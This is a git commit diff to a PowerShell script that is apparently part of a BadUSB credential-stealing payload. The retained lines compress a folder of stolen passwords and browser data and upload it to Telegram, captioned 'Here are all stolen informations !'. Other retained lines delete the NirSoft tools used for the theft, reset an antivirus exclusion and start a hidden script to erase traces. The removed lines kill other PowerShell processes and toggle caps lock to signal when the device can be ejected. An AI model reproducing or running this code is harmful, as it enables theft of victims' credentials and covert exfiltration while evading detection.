cbf2ba0c086232a407f15fc5295d251c443c5560
idontknow-CC <2sob.3r0th3rcc@gmail.com>
2025-03-31 06:21:03 +1400

    Update window_ciaoV2_upload.ps1

--- window_ciaoV2_upload.ps1
+++ window_ciaoV2_upload.ps1
@@ -24,8 +24,6 @@ Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:U
 Compress-Archive dump/ dump.zip #Compress dump/ folder to upload it on telegram
 ./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
 Start-Sleep -Seconds 15 #Wait 15 seconds
-Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
-Start-Sleep -Seconds 30 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
 Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
@@ -35,14 +33,5 @@ Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2_upload.ps1
 Remove-Item telegram_uploader.exe
 #Enable and disable capslock to know when you can eject BadUSB
-$keyBoardObject = New-Object -ComObject WScript.Shell
-$keyBoardObject.SendKeys("{CAPSLOCK}")
-Start-Sleep -Seconds 1 #Wait 2 seconds
-$keyBoardObject.SendKeys("{CAPSLOCK}")
-Start-Sleep -Seconds 1 #Wait 2 seconds
-$keyBoardObject.SendKeys("{CAPSLOCK}")
-Start-Sleep -Seconds 1 #Wait 2 seconds
-$keyBoardObject.SendKeys("{CAPSLOCK}")
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
-exit #End .ps1 file
